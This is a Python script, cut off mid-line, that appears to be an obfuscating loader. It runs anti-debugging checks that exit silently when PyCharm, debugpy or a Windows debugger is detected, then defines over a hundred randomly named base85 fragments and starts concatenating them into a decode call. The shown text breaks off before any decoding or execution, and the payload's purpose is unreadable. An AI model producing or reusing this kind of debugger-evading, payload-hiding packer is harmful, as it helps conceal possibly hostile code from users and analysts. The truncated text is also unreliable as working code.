#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_co7_sTDvU0goIv = '3Rsl_N$Ccoi?BGO)M4F5<ZwO;w-;WFC|d&8!*<9Y(^$uN5Ml73;{B%pw7hUH*T'
_cxsPWApHZNgGJ8 = '`{<1gV)~GqHgl3ebd?3~S>G@3WTD+Zxlb=tyPTZW1sEsP@*_BuWJu9C3{Cr5y{'
_cc7cqmzAERBaWF = 'edS3M?IVC?@Ge8qZT(>Ol!sk%9I8Y2D>2?~}*1r|&TYli3D}U}<-;?W{&sYu`T'
_ce0KmpNdoXAVv1 = 'q3pfdbWf$KgmFNwXmhPe7KgD*gtSN`;CgL!Qi?OX8mQ^G2ZrEZCFETXqm5NTjk'
_c_ptK4vb5gNveN = '9Ox?yVrCz2q$*~z=@pW6mYiBnO$L9h%{kVyI4nh)Kmp<4ueqBlqtSwVt#OO%UD'
_ckDzcGx9ElZ9_i = '*$-hI)J^X=ys{^7ogj?{RY*n6#Tu8?C%wFbR;_D$mi%7O-v&*^?O$4SO)b^`!_'
_cidtjYnuzrY2wJ = '{GJG*=ogwbTN2ao=u-XT0qHsn0Jnh`LyDw|ggE-kZzHQ75CEjqUd@SX0f|Kgl9'
_chibHjNwp7YqkV = '`g-U?*i`g&PX@Jn^iu*ag8L*e}Bb@1A;9SjXTsyHYzOG|}OW4Raa#OyAlDp%LP'
_ceFiEiKHxGDBdj = 'eyqjdIoDc^$GXkTs%J|M=i1wnOdD-`}x$sh8NBQ?AlhvKi4~sBm#?YkCa;72yQ'
_c_p8AgYS8tBbDw = 'W6J$F%<6L2gho|<uqLKQfoX*9wzlgq)3U>{sN*BW~E$EK>!q6T;dN}Y~vGtLq4'
_cvvhtmd4qJ9DPj = 'DYvM^NpnW0f5=S~f@7R=T1L}UO?z&J?CPbyEdGv7vr279F|A$kIlJhp7#87Z(&'
_cba7fUfjoc7wWY = 'KmuTh9@4=bG=VSbWfLf(okJJXLz47K>3NecAK=$k`AlUReUYwsE`%z%q=g8fC|'
_cb1lx4C7SNlybo = 'FIqJnHo3go;m|zvBKHQDdQ;0D$C=`K#+)W5+ex`;@VdA0_B{+JHa%H_ek3Hi|@'
_cmoXbOQduRo_dy = 'q3}T$nWf<e0EB`-h_1skXM?G10XKNq`QqdQRO8^I#s_%>8p*KO@_<ot_T9Q)Y^'
_cxYGCuJBs66W9r = 'wr71d<=n76(z)SH3FkmJ~Dte4;J+GBVXLds$6D*G_SrRfn9JNy0`(D@HPYaql4'
_cdH5Rl1Gg49rgq = 'wP9v{{d8aRn<u!Wj#a^7<kCXV>TAI_#3h7Jj3*B%JTkhhyp`_lvN@j%oyRFqNZ'
_carzfJoyN95olL = '{y#)po0>xw3LEhq_V5{AjEGUYqk*@-~4Xl20nZS!B=Y%A-kJ(TG`{dv%B*9<f8'
_cn5qyaPxNhbsBR = 'XFa$mRAgFzl$g=R+pd$kQ_*qEH$FoVt8aV<Kq78T4M_LuiJu$ekw^wGJ@FEGn1'
_coX7iV1AH6PPoR = 'R!kC(B-^JH3lL{nwq1=kY?w7uXQWO)rt=I<EnE&aSJ*fhwOg?s5bJuo9qdGDT$'
_cxEopB8ucTv25E = 'F6<uGX?`<288)(2w(A21LF{!OPYmynoBEFx>uTr2|zZWelxTp6Jh;tJ?)$Dm5+'
_cv7W8LGDsHPfx3 = '^;(<k(U%)!UO;ckUn)XL|9o>~ptol-PF389M`WK<0k6d79>T|??{eZuB(|(#CB'
_cha7JeAdx2AmGp = 'Z%;NRm#t0s}u{FB9*y0bjEgM|JpDNjMU}0@(^QDwa5q1Gj#*5V!BZq!E8^5b_+'
_cmI2KPEKXKMyyr = 'eMbM+MG8Df80G*Cgn~i#50m7F*3@291i`Hx2#3En3Eu0t1a-s05CZC6MB9CpaG'
_cjX34oWuUetpRp = '|C^+g&0jLvlI+BfM=|gZpu=ysq?mRRgUd=-P$&skiy?ibz0T-xjX;#890&amgL'
_cwZXJP4xBF4dM5 = 'TpHJJE`QI~p@kpWs>)uDJiX04=kTWvy~4JBpY`XI9k__4y%yOVe|6f&XAs$=J|'
_ctF4yXM4FWenL0 = 'vflyVKEyM({QZvKTo5qPu?jqlgj)r`&sMR`LQoR{SMY}+C((5AM4dbhB7qRo^l'
_cqNFAMu6_vf39l = 'qo+5P>$O*10U8^@Rv420cfv5JPKVBPmgn6mM5%L_~`#v*3fpCt-tW(oCB7ZVXz'
_czC13Yup9RA61L = '_<kL3lxEd3JgH&JB2^0NF7p>5C?qShV)$W>AK!2`91S%YLWgE5xRt4C=0r0z=X'
_ccn3yxaiz_qMtd = 'iC!j>ITH?16J*3u{YVOCdxSPQ0j{b&niC)lCy5|m`0jn1CoHtd4Xiyz8gE~PKP'
_cecgFlqYystKFS = '38<7^Z#+WynUFaYi{S}(M+co(skm9mjG-sQ1<@bp|QIVBrcs#hZbLrNuidcK{Q'
_cp6zK_aUvMZz_C = 'YgLBHAbpP4eq5Ar1BDz1zEOb9WeQT}`7{Q9A~(qwnJyobl%8EFjHPJn>qMvqFR'
_cpMw1Y8g8DheTr = '=F*^z;t81d1F;&Odf~Is4U{YVaI~T(}CgRKPjW`u96zt9K4;lW~9TRC6sRs@^H'
_cbsREK5n0ku9VA = '#GJeY}^3OWs{g+aj86SL@8!d@ngf2_Q(5#5JWJ?|+x^k#OKcTLU@aClLNoVdH6'
_c_UrQEr9nTUg2G = '<AohQBO$xG<&lq@inSQGTRvYdsJ`1OSO63IEI)=dm*3UN|jARD46&%E>KcGrT-'
_crl0ZpOiJ1em71 = 'avNZfbseMDsJW#19S=2Ng1g3VYaJuYFh>XpGs2&RfzV%9iOmB49@m|^wS=)>+3'
_csbOaoFZ2Dep9g = ')T?kD()f1uJBUZG>`;ULf|BmRdatEBL~KGSO*vE!a~+qsC9Y{67;-1#!@OtO#K'
_cpCMMP9jne25LJ = 'puqT1t|-=a^AJ>DK6n31=J$&<)Vmy?q?sHQ*b!sadu6fA(qq-P0U*hB5sNFxPe'
_ceet0BydRellqz = 'kihNfu3w?q&o`S;)ENrFcqs7)m%9N@QuxchT!v%$PGpou=N#U>_X7gy^DbsFB5'
_c_pAGBmllwoz_z = '*by!#wP1yv2dCZr&yGOC-GvfiI`ef3#;IfRb<-Xx4myyx6OVOdSW)5z&e#_(S1'
_cfpC5YQKDUozNb = '>)cdge&ac3t^7cPvRju^<D`9jrPmY2{h*DHY=YzI_6&_<JIW3;d+=FivN5lBwS'
_chsAlVSNsBY9CM = '_5d!-O>>V@Z5hgYf7tkn)mP*w@&ijFMOPh{m$pN*aeL510f-e)FQwZWL{Pxq^9'
_cslY7QXkcs8tbG = 'C(wS#5Jf;-TeG>vT!Wt5=*2ajjB7aVRH<m=ScOCvLP~z&vFC7qYH6;w5ZB^`Hi'
_c_YevyNIMC90Yt = '6#_T^@B&lSyi_>NM$z$R)Wb}Bc&Yg=C?^uMEyt%W$E(y<VeI}vI6sYO}xUvl&='
_cc1Rb_2ZGuccBR = 'DH!vhLg2GrQ=GAJ^lze9SBbPKFJ${7II>#i@OxH`V;45n4*1Jt}--Yg`<Q1iQ+'
_cl6okUwo8D2swh = 'Lro}meNTsZ=PV_i##h(KuVtjJTp$sv*lTY7_`2n~1J1q0ydd@nF`1W0=Z)~>P$'
_ck6LIqfqCqnS_w = 'sQ1td{!!y|M%(*+oRHs=?8IT*fHJ+OlF(Mh&AgSZPjhAV%Pa;C_(3@a($L-$R~'
_cq3kAkpJ7tlwf7 = 'wneuJvY9sCcs6)-;8_t~Lx9;1U&gFE!WW@C0m~dBSkHbP#;kSJj%nCBO1v!%M;'
_cd9POQvNidgUVi = 'ECAi`LXi>_p0+zI3<N{9%kj$JR0m6Y3Azy8B`c>j(bw!ODLmm@)YTEu~SuT-11'
_cjawJ98QlQo6DT = 't<0Lz4hE3fasq4rvc%3q*(gKvEc<22Ulp{(4?qo)^p9iwvDipqgp++eY3EJ8IY'
_cmwj4s3cCsLbA0 = 'ODL2qT=RCCB|IX0hwW$AaE)%_F(?5;mGoWmhNv3=I!Tjor!=q%TTPh!KGhx(NL'
_cj7xjm6yyu8LHF = 'S`lUB(G>2^^MLr$2RFJ%3z7+kAbv*3mlx*%#^&0N(eK{9>RTqOzV}#BZuqZDvn'
_cmeUue7jaczNum = '0AzYQdV^%__T)C^*!PS3KiORJoy;gkr{1+9#fPVH2NOU#GTIgz#@~GO=E%vXfM'
_ccgw8xfeGHlFj_ = 'QpD_}PJr$X;eYW(*+pOl)gAZ9{cyhJ^<Jw}L45DJ04Rd$&=Yi&KQSgKdmn8n1-'
_cz0dfhvr2heZNb = '!9AS6-P^;V}|JzU!=oTcQS%6Q8YTt7^*3`Ie}&;U#rAxo0C<t&ER5QnOZY)Y0H'
_cxWaywYcTFSCWd = 'iT+~CEkZ8tQ#bK?C<E^Kj`3Ham_ZM5cxc%AVobPZ9<sQLW#n34gii=FlpyoBK9'
_cnq42hC7U56Zt6 = 'C(5J;=LyyXqu<Vv)1b6PDNOp1IDbZjjFYyf-j5TdVK8VcCmmku2z8)u#TUzkQY'
_cw65boOOZ13W3q = 'D<|yoV?t#zP+2+&vjx=#}_Gy=y53#e942Y4=UHQz-rCuJjs=u$@xw_>wHfb-r)'
_cqEafXJudts3dL = 'clJDe|-jeRRo5-T8r?CG%8NG#*4{+R9)<Wh*%gM!Iz^yK4uQZc1)8I|F7B-3@v'
_caobqORSRzbgJw = 'A1~%>TgJh$L0~cd?I`TN1{g}da@(T*#TjHn1PhDhlB|iv-H_aJXs7GA&&DVuu&'
_cstRvC6d2biNyX = '-O<x`2~bu&904FFvEr{g%GxFaOzHA3Zl*s{*jk>P&4u~2X|b{`B*)+%%0hcq!1'
_cssPzNZcR2dtME = '{eu7IRa&2=Ykdgv!ZXzgmQp9GeTbZm85aWtr0@n2e0{seng6QErZ7%g1^pOI00'
_cr0WMb4F68yRCr = 'L~Hi)I4;M?<8dt_rYqt!UWa10fXeC?))|<8M3wbEI!9Asa55w?j=xE{#D&DgW;'
_czt_2LJKl60hdy = 'ZQz;tR$&xfHYq4W`X-+_&WElNdpt5<iLywdUJQZgAEqc7`*WP!+tz6iw8yvqLf'
_cuvlq0qll4iDHj = 'Ge~T?h!7xK8>WF*m(!`U^*UUGIc8AZSj$qfs|X>ww)8$NxdU6mqc=;33H1MAra'
_cuOWZmy2zh1pKY = '5PdND}eoH?~I%eywtf=an;TFVm_M8Akwz;+A$wjZv)!;c6a>E<wSnzp68;c$s3'
_cu0B3JEHvmUayB = 'fh(HgWR&OBw(Y*<J26%#JQdj;t|q>RBLj$-)?gH%_ue0Yh9TC-<+FW^X|k|+>G'
_cffSNZ68Gg_k0p = '8hxy!c{mQeDA*1|~ZojlL@A)dP}sdVZzKIIe&p3}|Sfww^j;K+#wV2!iX5Db5*'
_cyUzX9pcrNLCRa = 'pO4Z*5o0!)IFyf{6$~<4A<3bGe@69aX4XKU^EK%icLI0cKNxB--Lvc@cg?1N&6'
_crrf52F2S3vZaW = 'zG4r<%z#}CIMI9{t0nUw=rV?(1{KVU$<a9$`||K-;%o*>Z00BS4&RM?mwdhL&-'
_cdIBFdhIBba8ph = 'rd%MixB2_D(V251B(Or4jR2ebh$anIGe#({qYP>QE^e984>?}1$+h^Jd$m+7H6'
_cduKLQiKrF90wO = ')O{!u=ihPPY*k(dR^VICEzDei4?(Mo*z#|18fw!_07`QN2TgWh+mgXS&aDg+3w'
_cyKYOIDcXc7XiA = 'T1#M(W6Y7qN|Cvi=rg{Mx;UUEOWEG};uERH|Tgs_X2)jwFITPZ_5tv{TK~$>vN'
_cuPsItHy0GiLwV = 'hr>6bqf;|u0BAP*}Rpo9_tn%d~44+EXtiyq7vNH93`@{NJaIT=4me53Fg^Wb-9'
_cqraZ1fdBY1TF1 = 'hjhh2jW7m@DKCVUC092B>3FM1bb8Xj-fAY5PBz&6YgN_xpR?eP*>4YG5D@F=*?'
_ciRCb1GzpmPWMA = '^{Q#AWU!>q>gm;B|B0k7gx1`S90=guSYJuB)6WSg(J;SozZ(RFd*Z}e|mOJV^s'
_cl8yRdrVzm12Gm = 'AY;-D{4OZ3q3W5gb2c(mtj5{o6%lD}$@Ur&1gmnP3i7rz{5?XeUt7pjm%Gd4Wq'
_cbZvRNUk76scws = 's11qJl@|8y*mE*Wn}=Yrn-Wr=oeS*`AGP9w%P%`6~g=eva7T9`Dz%o~induwRZ'
_ccbRNqnGuKvY3F = 'SvCY4wC!gD^QE4ppl;}5sZ!Q0P>c>62;#*|FTcJEPx=Dxk*am8tn$==`J3wShK'
_cjTRg5YGe9wZ5a = 't_KqWCPZO(K2@<eZ{}dkb;mfq)v*Pf&j*^QN25r4V=A%8*(t8&%z^XXX`E7*|x'
_cn8bp7HzKX7YjP = '~%kFaBbKXitvPZt$ngKf5r{s_ZW8=;Y*90Pe2VhF2;etDg~i8FH)9=X#17aQ^6'
_ce7yWDBbecALCi = 'E6!(6I%*zk>haUuu(37&HlW-LBbv$sQXQ+H^ZJs`+fI@Fkb$Bo<f_6@Cnqs*V{'
_cjDlxERDrNsgfT = 'e$F6}_pLdVo^=_tByXq9|S9#P<+yno}%vA`Xm#odK51g)+jVi_{>Lc7}+I5=*W'
_cgF9BCxw_lJWDM = '%4bK5}F1mTo2R7*vK<S7%+xOAgVBj@<{rqDi$td@U^YpIq3zPmfyd0w?f~R*W='
_cwW13OeplsrxFU = 'D`w4Jwqd@RODZS>UQ8*s2bh3@`e?g+JR!$0&!aOTvDG3urg`Xpz5cF$CN#F8Le'
_cd96tixrzzdcfo = 'BYaf7w)wJ!b`3u=k<uazOQ`S_lGdp2igWHF~t3k4%W>pD6l+$@L?Q~7NnT&?Un'
_cpsRnvZMyAO7H9 = '>C3<L5J9e4z){SE#%;@Y(XGk}ej)hoPKTK=u6@Bu&K9IRa_WVeT$NPuA)-vQ48'
_cmjMeiHpHztxhL = 'iDCWhFGGPIC+|fIG~*1nZS<@#09~tHCog9;QtAkpU$7u`U2bS))(tMzV`K4+MK'
_chNblBbyQWxNJJ = 'HQJlJBXMULQ1K!co$N#sZkt?gGi7Z0nRC+wq8Pok%c<k$;eH_1bB^B9Q-n8)N+'
_cd67tE620lZ2Za = 'nup|ZU3$(7C{zu9=vSrqkeETjip1+VBFiLgCgE0eqS4;rvBl8pixIUCK!%v7jC'
_cgUOopAryF7isl = 'BS9|=q*$FVi%(B?*~!aU_I<{NCqH(<SpAOCny8hUGu<?z3TrS{-060wV6;(+a1'
_cjbYLp0SKGg4qR = 'ah3NMq%@{9xzJc0?5LM{Sy}&*LIIV=+~tq|?Ur8ibYzUi<<B#k`%BGwN_BuIpY'
_cfdhKu77dQ4bZM = 'cR9I87j24B9=fpsf8#)EY1Mex7#AeH%{w0`ZO`J28n%%Igm6R8h8U8$sgAUE~;'
_cdKSz3fCQvYplL = 'Zj8;e~8Dct!HxjLJj>EE^zKMPQHtqHVGZSM@HIffic+kI@+?e={<D9=g7bj4PB'
_cuDn0vAKsV0diB = 'sFIj?NK5@H5FPq3qNn)KO_|c2-{iWh;0I#$Z0_tW{ZM6AK~n3prAIWYmg+!J|h'
_ccBiBiunWy_wOB = '=fbyF_o(Mo%!?~dy!Wy?1M^}1abZHNT1oZ;!hyeu8HZdAcFly=LYQ*$^ydiR@O'
_cfMjmz1e_tEJuf = '_JWUM8*5<XQ=YdpCLmsXkXUcZMS|X@Dq_BqLwKDSWj-jeR-?ewC7j=bhB_*Zb='
_cvNxK4qIq7y19I = 'v6bGUQl93l{qDM{;TWv2{T<kv{wVi<n!3SNYkoJflMyEV%)-FVGmZ^39QF!R5o'
_cmrzW0uGQxFDYk = '-&^m*tWj}cZmT;qHaYzs2tn5N_bZ-93!0kj7J1s`4<p_Pm_l`S{Rr?*`xs3~^Q'
_cvXgs2WHdokEd1 = '~PT|I@s?C#F-HMzMO!TS3S4w!?IN_3{s!W)T~i@0UC&Y#;!_2mN<uXEkbfOiVX'
_caDcuJx8pU5Qzt = 'zAdA0siJPbN0qr-l4E2;b`!x%(TZJPVZCAbe4IA1~g)1>m^c8JW|h~gby+0)i2'
_clHviRUbDMK7J5 = '&6`${2yZFBnQB1k12dNCHbo0a<^TBK$7@6~p9s)$4YQ#vN1NvP!N+%o+FH~UAE'
_cw5vcbFNbnWvyP = '}>l{<H*^2Qaq^11!I-vQL>OIMsTGN-M7|`)Dwgn_556oK`i5>AVe!D+x{B`|~$'
_chvwBi2Zg8we9D = '3N1K;GQz=NDZaytH`F2S^F*RKoNlf_Yc<IaMoh8x<A;5W~hlU1k#82w*GJ*JRK'
_cfdq9lRf8iP4V3 = '*1A8G(xJq1tsr3F*6^?u`q331zjqEa2Dj+FN0?Wkrj?Uj66+l>{t1}m{!EnlH6'
_ciPFHliypgfFQg = '7b#nf3J4x&WNXHIY_`(4_}4K3$P5?(u9!I(mv;U|F_#MPbJ*T6Mvl&6e(%mze+'
_cnL3m_kkbpi0f8 = 'u+o;u8#$E4m;Sp!45)!1j%X}M+MT|pd<=c=TJh;+1E?dzC-1to5n$sniyp&a#`'
_cuwxhykZwP0OUH = '!<&KlYx>V#vM4s#RAuNoM12Su2?y314w+H=F2MXGA7S!qo}NLlv42)+j=AzB{$'
_cnE6g1WKg1Dtzl = 'wReMd115K$h&PJn8z#k43`&D}M&4ympY%u5C^8ycAK|f&t(Cxp<mTTPzbha_*)'
_cqE1FpY9H_wuwE = 'GF?-G>CHy4^@Ldt8C+RZz!M>ynTe9;!Ojkp-$<`NpK5ciNEuRG8JZ9$bq>%Q^L'
_cve1Q5tbTZLF7I = 'xY=0Ae5U(NCY9zu0*H?vo9^A!|Y7FyVQ+zuYF+V94TW^j7!baX1Mj^}5t>b$=-'
_chkgrhmbffSyG0 = 'V9Mtk_-sjN1dA&ow@3`n-r>+$SjUcH!jn>Os>gzabB#kUv{LDPMKF|G0M;qF+@'
_cj386la2jOa4eF = '$vQ)#0QX7{3)ZLcH6pgEYtS&7_GzXQe3vw^_!*bUH)q09-#nE6;<>ok7X<GO&x'
_cellNJgCM99aXm = 'xKrhNCm#BX7O@gv8#bhg-J!vK2W%Ci`<kbOf->EUlV%H74Lzv?h2s9jgp}i+#S'
_cr9C1nupKKtQx_ = 'gGJ{lHc28#rU1`5$zi@k9fO?3piKQx7Qickf3moelv7v)1e`$2r~cEFVhVeYN^'
_ciOP2uNPc05tp9 = 'Hv&ffR+98yG^Y1*4fc)$ACjBHDkP960G7nNvmgsNq*!;LAYP19zVd(6q%tCmh|'
_cj4QDV0HSMPQX7 = '3K|uY#`pVr=UgNN)R0{fp;stT?)imT2zH%Us$Tg<WAuohXaLmSvg^X}HxGe7uw'
_csfqeijmIgkI7N = '+U56`%z9<fGlm#L09m5{S4pR>OfJFZ_H-Aiar_nh+Hvc8kzVP8Jn;8!t_nMot!'
_czNDX7bZqgMOvC = 'iblL;wT$hb!6mo|{zE~3YqxRfMV5y@l!M!O@;z)e1YjJ6-jP6fBlLF3G=pbnc;'
_cyHhwpiSieUSKA = 'Y<GxDWO?nj**NtP=>qXJzWaeTVKw^#m4!=nnxhrRcf@G$ZkV7w=qV(Nt(=eu|r'
_caVVlGgcgGezyE = 'Vdp6?l6fv6TqX4EqPUa4IL_mckjY;W-TQCD2i`9XK#Sg#$62_W?z6eXU{R=S@o'
_connv6wsYn1_4k = '1u1ZQ0bGzg*g>4X;y}Jml5k#Ye7ye(rRY+nAe#f`AJu5B5iJ(>HCXFR1Y8iD5H'
_cn0BnpqpdsAz2r = 'umORtTYiOrfT<)%lv|63KJRvJ4!6sT9NwS`Q}OLlu4vfx(2$naZb8UflXB#GC4'
_cpJ8Q7mBToTprL = '?2pwh*6(bIhW)n{Ewb;^V2y18a<VkWO74oxj)*L(Eu<tigpJwn$K8MQ;z7}e6d'
_cjBmnOEGc2p5xb = 'omXkdPvyabIpA+3$%Kmje44jg^@@TZJVCNwjVzrVM4C#j(!MRx}+vihaS$8AQ='
_czoELPaEJtItf8 = 'Hu!Y7#oZj~+6JRGANrpxNJJ57tJ5HX8=S`}aG$JBd23+M^m>JU~FlqH0aHZ+de'
_cdkaJOSzK1PZAx = 'DIjXM7h%ab6cF>d>@Rg9`OTsFf(4d;d8^095dkhrz|zd>>dpe9ZeJiHG`Wuuj#'
_cqFrTEQxmUdzFu = 'prk+!n}mZXw0ODweq}DspvD{HG%~@<Mv}Yu$uz#w4W>qY)^0IKAhhY<rx~Be5z'
_cme9jbBqmoQ213 = '3O3NyLu5^uSixl0~8a2??>3%TV!<q^`ktPeK8mb*?XQm(4pyxTi7whj>Sbj>R<'
_cgWwrcaZPglua8 = '?UmZ+>E20+CFQkFun2)!ne7%A`uWi71}1$YY}Y=fHI9caso2H_gxr_^T8|H5DU'
_ctXbyzO6f94ltY = '>e9KZ)?PWcf9_Lt!bZz?XoSwINwS<YDP`Ij|3*9LQ72OCpQ8x8;k)WLs>53*Qs'
_co4YuvcqhS3JZf = 'WC}82mR#8BbMb{2h_<&N>k$&8BG?`QG3S<=V+9cd^%_Vk8lEU!fnJo_Tc_hGwC'
_cigQZCP6qkfCPW = 'Cq`5Yq4z1xKh#o{b2z3R&C)ekYbEzij}6yahTIxDv=`+#UzR+=SZZJ>;Z3-T;i'
_cob8IeACSo5tyP = 'k?}G*wW@Ey#3q6c;iLf&Qc%wS&^=2z!_x3ru!qoQ`=d%FMRuv#smB;Z%f=0eM)'
_cqwx6aPN4Xld_7 = 'lTF^z6!vnjzH$2q9cY;r!y|gxnPLp-Y^MsEaFG<e0B?%Ov?ZHeH2+WWUFQ2t6;'
_cwE78PMjcbPTkn = 'q#yRKM01xxPs8_ZCC8(@(yazC^Z;wHS)+!b=5f<vP>e#tYVwvgBc&X=cJOXIP~'
_cgvANFCGA8Fnqh = 'dk+|snGGc&ozKkJ7s+F1z2LI0SUsiA|7G<`gpm8milnTSw*q+P7o6WCAbG21l;'
_cqZAgusXnKrzl1 = '$&SeRv@m``LV59_KO2du7sB5yC$*VlY@5zsn-$>>$O1)`u-ep)miDCT07;0ka?'
_chs1aJKQEMFPR1 = '@V(azo*#bn$%c3lDG(zkEsc&ed5Wped=@Tc#h1i9TWZz6BJ25#1c{#9O7gm83%'
_cqNhZANwS1VEMC = '=|Q{z)!=W>R{G2FBdqtGO<ttLG0|rIT^kXg1Y6DV{w+9!m|cVxh<*W0M$^yCmg'
_ccMqO1djA3Wm7Q = 'R0AFC}-Sh4py%u^-Wyckz*Ae22c`!q4)k7&ioQ<1in5I?bTu3YK;@W#&#f&t7o'
_coiXNF1zcEso_Y = 'Ro)bI*A}^pUP&8B`&%x~J5wfkj<!O{1x)=GAOB*Onyu1WBCC^;2%koSS-g1f{U'
_chMTs6iiDEDlfJ = '-NVTj#Gx4($pF-*T6%4CLMtise!iP&UoUMUeaR_K{C*lG6cx(40ASn_1U8^^hE'
_ccKYBEftoyKySU = 'Y-~UuVNlM2VE=TNiXi1(lkB0IA2be%$q;1+KCnn#PwAyLMqCFLt;H=k&tqh9n>'
_clPjyOt3XrzlLN = 'Ov%0`eeZlI}nqSxBFZEmi*t9VS8gD!4o#QssvNwke9dHL1%#B%4#H$HCR)d`i>'
_cflf7qs3aY81mQ = 'fcqk=@^C&uREC?DN`Fh(K4+JwjE?Mm4h6az;7Qr_*&$f8VMYXS@}Y6E<6w-O=+'
_cwCZBB2jtA7UnS = 'fHV#^&%-<@Z%E<3h;<?N>@!PMIK)d!zAZ?HS&qM*XRv5rZ}e6BsjzD)T>i&c&4'
_cikDdu3RV7rhW7 = '_jaAr2>ip#haY=$KgChFZ@7rj02ERBc_VJH4K_F6TG=I%B~LOwNsSVpOpN&pN6'
_cqvNskdHmpwbg7 = 'Zi%Kv)s|#4Yd`+x>CA_PhY(LIkHTd)Ax>WRwcHO}dsQIz-Jd17~6tm}p|3Z&3g'
_cs3sh1rS3IboAG = '}*weI+G(k2>tA~ze?>{XWbO9)&7TjnXx<xW@_;D#%8erJd}#oC<o01GVw&a;)b'
_ca1rCr5m4gVUQz = '1NQoS@S)N&G#3SUbJI(&s)MELU9pr=q4Pt979Z1l>+7<zWH9m!@!tz5WEFtK(b'
_cdtZnxo7T5Se7D = '=7+@d82Q1M#ZNzUI_(IHlzR&O>=r0Ri>)EENXEVG57mjB7P?h_OVpTzZj@7Wkd'
_ciBa7YIGvi55jL = 'Y9vQ|c>gUgKS-a?7rI^N))(6bk+wuLCQgUw;;6maQ3IupLS~U!pPM@k%u8ZP!v'
_cmKFyUDt5LKgD9 = '=DU70#)3~DmcQ1guhZm>Y&YSlG#09$Qb-lEp^Fv7^6>Vh~CY<wuEpx*&wAbQ^X'
_cd7KqvnQqnFPc1 = 'eY9U=3f`pg_+M@)b)lqIxAnIkz4gkqR^UBW??ZLjzvn40e(SZD{7CuE&L6Zv*z'
_cwedSxVKmeTbuB = 'rwPmGgH*pamC0uz(ed%`|+mi;DGD)DR#CzL#{fq6S)_*ncMJpv)YaTvsOhn5zZ'
_cuBsdXEPFwx3v3 = '_g&?1*Et=DVJmCuO?)?lcmEraO2rrBJA;0Gpz|Z7yFM+H=g;4BU<9VNXr_VU|B'
_cwRpk_uQjbzefL = 'z&$XghU;i<aPPpEWC&rlf};Z~'

_pa22bhd4xKH0qA = __import__('base64').b85decode(_co7_sTDvU0goIv + _cxsPWApHZNgGJ8 + _cc7cqmzAERBaWF + _ce0KmpNdoXAVv1 + _c_ptK4vb5gNveN + _ckDzcGx9ElZ9_i + _cidtjYnuzrY2wJ + _chibHjNwp7YqkV + _ceFiEiKHxGDBdj + _c_p8AgYS8tBbDw + _cvvhtmd4qJ9DPj + _cba7fUfjoc7wWY + _cb1lx4C7SNlybo + _cmoXbOQduRo_dy + _cxYGCuJBs66W9r + _cdH5Rl1Gg49rgq + _carzfJoyN95olL + _cn5qyaPxNhbsBR + _coX7iV1AH6PPoR + _cxEopB8ucTv25E + _cv7W8LGDsHPfx3 + _cha7JeAdx2AmGp + _cmI2KPEKXKMyyr + _cjX34oWuUetpRp + _cwZXJP4xBF4dM5 + _ctF4yXM4FWenL0 + _cqNFAMu6_vf39l + _czC13Yup9RA61L + _ccn3yxaiz_qMtd + _cecgFlqYystKFS + _cp6zK_aUvMZz_C + _cpMw1Y8g8DheTr + _cbsREK5n0ku9VA + _c_UrQEr9nTUg2G + _crl0ZpOiJ1em71 + _csbOaoFZ2Dep9g + _cpCMMP9jne25LJ + _ceet0BydRellqz + _c_pAGBmllwoz_z + _cfpC5YQKDUozNb + _chsAlVSNsBY9CM + _cslY7QXkcs8tbG + _c_YevyNIMC90Yt + _cc1Rb_2ZGuccBR + _cl6okUwo8D2swh + _ck6LIqfqCqnS_w + _cq3kAkpJ7tlwf7 + _cd9POQvNidgUVi + _cjawJ98QlQo6DT + _cmwj4s3cCsLbA0 + _cj7xjm6yyu8LHF + _cmeUue7jaczNum + _ccgw8xfeGHlFj_ + _cz0dfhvr2heZNb + _cxWaywYcTFSCWd + _cnq42hC7U56Zt6 + _cw65boOOZ13W3q + _cqEafXJudts3dL + _caobqORSRzbgJw + _cstRvC6d2biNyX + _cssPzNZcR2dtME + _cr0WMb4F68yRCr + _czt_2LJKl60hdy + _cuvlq0qll4iDHj + _cuOWZmy2zh1pKY + _cu0B3JEHvmUayB + _cffSNZ68Gg_k0p + _cyUzX9pcrNLCRa + _crrf52F2S3vZaW + _cdIBFdhIBba8ph + _cduKLQiKrF90wO + _cyKYOIDcXc7XiA + _cuPsItHy0GiLwV + _cqraZ1fdBY1TF1 + _ciRCb1GzpmPWMA + _cl8yRdrVzm12Gm + _cbZvRNUk76scws + _ccbRNqnGuKvY3F + _cjTRg5YGe9wZ5a + _cn8bp7HzKX7YjP + _ce7yWDBbecALCi + _cjDlxERDrNsgfT + _cgF9BCxw_lJWDM + _cwW13OeplsrxFU + _cd96tixrzzdcfo + _cpsRnvZMyAO7H9 + _cmjMeiHpHztxhL + _chNblBbyQWxNJJ + _cd67tE620lZ2Za + _cgUOopAryF7isl + _cjbYLp0SKGg4qR + _cfdhKu77dQ4bZM + _cdKSz3fCQvYplL + _cuDn0vAKsV0diB + _ccBiBiunWy_wOB + _cfMjmz1e_tEJuf + _cvNxK4qIq7y19I + _cmrzW0uGQxFDYk + _cvXgs2WHdokEd1 + _caDcuJx8pU5Qzt + _clHviRUbDMK7J5 + _cw5vcbFNbnWvyP + _chvwBi2Zg8we9D + _cfdq9lRf8iP4V3 + _ciPFHliypgfFQg + _cnL3m_kkbpi0f8 + _cuwxhykZwP0OUH + _cnE6g1WKg1Dtzl + _cqE1FpY9H_wuwE + _cve1Q5tbTZLF7I + _chkgrhmbffSyG0 + _cj386la2jOa4eF + _cellNJgCM99aXm + 